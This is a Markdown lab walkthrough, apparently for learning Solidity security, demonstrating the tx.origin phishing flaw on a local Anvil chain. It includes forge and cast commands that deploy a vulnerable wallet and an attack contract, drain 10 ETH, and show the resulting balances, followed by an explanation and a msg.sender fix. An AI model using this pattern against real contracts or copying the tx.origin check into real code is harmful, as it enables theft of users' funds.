## Phishing with tx.origin

**Reference:** https://solidity-by-example.org/hacks/phishing-with-tx-origin/

What's the difference between `msg.sender` and `tx.origin`?
If contract `A` calls `B`, and `B` calls `C`, in `C` `msg.sender` is `B` and `tx.origin` is `A`.

This demonstrates a **phishing vulnerability** where using `tx.origin` for authentication allows an attacker to trick users into calling a malicious contract that drains their wallet.

### 🎯 The Vulnerability

**The Problem:** `tx.origin` returns the **original sender** of the entire transaction chain, while `msg.sender` returns the **immediate caller**. Using `tx.origin` for authentication is dangerous because it doesn't distinguish between direct calls and calls made through intermediary contracts.

**The Danger:**
- ✅ `msg.sender` = who called this function directly
- ⚠️ `tx.origin` = who started the transaction (always an EOA, never changes in the call chain)

---

### 🚀 Setup

**Start Anvil (local blockchain)**

```bash
anvil
```

---

### 👛 Step 1: Alice Deploys Wallet with 10 ETH

**Alice's Details:**
- Address: `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`
- Private Key: `0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80`

```bash
forge create src/phishingWithTxOrigin/Phishing.sol:Wallet \
  --value 10ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast

  # Contract deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
```

**Verify contract balance:**

```bash
cast balance 0x5FbDB2315678afecb367f032d93F642f64180aa3 -e
# 10.000000000000000000 ✓
```

---

### 😈 Step 2: Eve Deploys Attack Contract

**Eve's Details:**
- Address: `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`
- Private Key: `0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d`

```bash
forge create src/phishingWithTxOrigin/Phishing.sol:Attack \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d \
  --broadcast \
  --constructor-args 0x5FbDB2315678afecb367f032d93F642f64180aa3

  # Contract deployed to: 0x8464135c8F25Da09e49BC8782676a84730C318bC
```

---

### 🎣 Step 3: Eve Tricks Alice to Call Attack.attack()

Eve might trick Alice by:
- Sending a malicious link disguised as a legitimate dApp
- Offering a "free token claim" or "airdrop"
- Social engineering Alice to interact with the Attack contract

**Verify Eve's balance before attack:**

```bash
cast balance 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 -e
# 9999.999802205366122880
```

**Alice unknowingly calls the malicious contract:**

```bash
cast send 0x8464135c8F25Da09e49BC8782676a84730C318bC \
  "attack()" \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

---

### 💰 Step 4: Eve Successfully Stole All Ether!

**Verify Eve's balance after attack:**

```bash
cast balance 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 -e
# 10009.999802205366122880
# Eve gained 10 ETH! 🎯
```

**Verify Alice's wallet is empty:**

```bash
cast balance 0x5FbDB2315678afecb367f032d93F642f64180aa3 -e
# 0.000000000000000000
# All funds stolen! ❌
```

---

### 🔍 How the Attack Works

#### The Call Chain

```
Alice (EOA)
   │
   └─> Attack.attack()
          │
          └─> Wallet.transfer(Eve, 10 ETH)
```

#### The Vulnerability

**In `Wallet.transfer()`:**

```solidity
function transfer(address payable _to, uint256 _amount) public {
    require(tx.origin == owner, "Not owner");  // ← VULNERABLE!
    
    (bool sent,) = _to.call{value: _amount}("");
    require(sent, "Failed to send Ether");
}
```

**When Alice calls `Attack.attack()`:**

1. **Alice** calls `Attack.attack()`
   - `tx.origin` = Alice
   - `msg.sender` = Alice

2. **Attack** calls `Wallet.transfer(Eve, 10 ETH)`
   - `tx.origin` = **Alice** (unchanged - still the transaction originator!)
   - `msg.sender` = Attack contract
   
3. **Wallet** checks `tx.origin == owner`
   - `tx.origin` = Alice ✓
   - `owner` = Alice ✓
   - **Check passes!** Even though Alice didn't directly call `transfer()`

4. **Result:** Wallet sends 10 ETH to Eve 💸

### 🎯 Key Insight

The `tx.origin` check passes because **Alice initiated the transaction**, even though she didn't directly call `Wallet.transfer()`. The malicious Attack contract called it on her behalf!

---

### 🛡️ Prevention

**The Fix: Use `msg.sender` instead of `tx.origin`**

```solidity
function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner, "Not owner");  // ✅ SECURE!

  (bool sent, ) = _to.call{ value: _amount }("");
  require(sent, "Failed to send Ether");
}
```

**Why this works:**

When Alice calls `Attack.attack()`:
1. Attack calls `Wallet.transfer(Eve, 10 ETH)`
2. In Wallet, `msg.sender` = **Attack contract** (not Alice!)
3. Check fails: `Attack contract != Alice` ❌
4. Transaction reverts, Alice's funds are safe! ✅

### 📋 Best Practices

1. **Never use `tx.origin` for authentication** - It's almost always wrong
2. **Use `msg.sender` for access control** - It represents the immediate caller
3. **Use established patterns** - OpenZeppelin's `Ownable` uses `msg.sender`
4. **Educate users** - Warn them about interacting with unknown contracts

### ⚠️ When is `tx.origin` OK?

There are very limited legitimate use cases:
- **Gas payment** - If you want the original sender to pay for gas
- **Non-security checks** - Analytics or logging (never for authorization!)

**Rule of thumb:** If you're thinking about using `tx.origin`, use `msg.sender` instead!
